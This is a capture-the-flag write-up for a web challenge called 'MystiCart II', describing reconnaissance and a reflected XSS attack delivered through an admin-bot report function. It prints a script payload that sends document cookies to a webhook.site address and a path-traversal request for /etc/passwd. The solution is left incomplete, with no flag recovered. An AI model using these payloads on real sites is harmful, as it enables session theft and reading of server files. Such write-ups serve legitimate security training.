---
challenge_name: "MystiCart II"
category: "Web"
solved_by: "Individual"
competition: "Latin America and Caribe Team Selection Event 2025"
---

# MystiCart II Writeup

Search, reflect, and uncover: Can your keen eye reveal the secrets hidden in plain sight ?

## Challenge Analysis

MystiCart II is a web challenge focused on finding hidden secrets through search functionality. The challenge hint "Search, reflect, and uncover" strongly suggested a Reflected Cross-Site Scripting (XSS) vulnerability. The web application featured a product search page with a form that redirected users to a URL with their search query as a parameter.

## Phase 1-2: Recon & Scanning

- Initial exploration revealed a search page at `/` with a form that redirected to `/?search=<query>`
- Viewing page source showed no hidden comments or obvious flags
- Testing the search parameter with simple strings showed reflection in the `<h2 id="searchHeading">` element
- Testing with `<script>alert(1)</script>` confirmed a working XSS vulnerability
- No cookies, local storage, or session storage contained flags
- Common endpoints like `/admin`, `/flag.txt`, `/api/cart` returned 404 errors
- Product pages existed at `/product/1` to `/product/8` but contained no flags
- A report function was found at `/report?id=<product_id>` that returned `{"message":"OK"}`

## Phase 3: Exploitation

### Solution Path

1. Confirmed XSS vulnerability in the search parameter reflection
2. Attempted to steal admin cookies by reporting a malicious product ID containing XSS payload
3. Set up webhook.site to receive stolen data from admin browser
4. Crafted payload: `<script>fetch('https://webhook.site/id?cookie='+document.cookie)</script>`
5. URL-encoded the payload and injected via report function using search page XSS
6. Admin visited the reported malicious URL, executing the payload
7. Received request at webhook but cookie was empty
8. Modified payload to fetch admin-only pages (`/admin`, `/flag.txt`) and send content to webhook
9. Attempted to read server files via path traversal in report parameter (`/report?id=../../../../etc/passwd`)

## Alternative Approaches

- Path traversal in the report function parameter to read server files like `/etc/passwd` or `flag.txt`
- SQL injection in the report function parameter to extract flags from database
- Server-Side Template Injection (SSTI) in search parameter despite XSS working
- Forced browsing to hidden endpoints like `/debug` or `/console`

## Toolchain

- Browser Developer Tools (for DOM inspection and network monitoring)
- Webhook.site (for receiving exfiltrated data)
- Burp Suite (optional for intercepting and modifying requests)
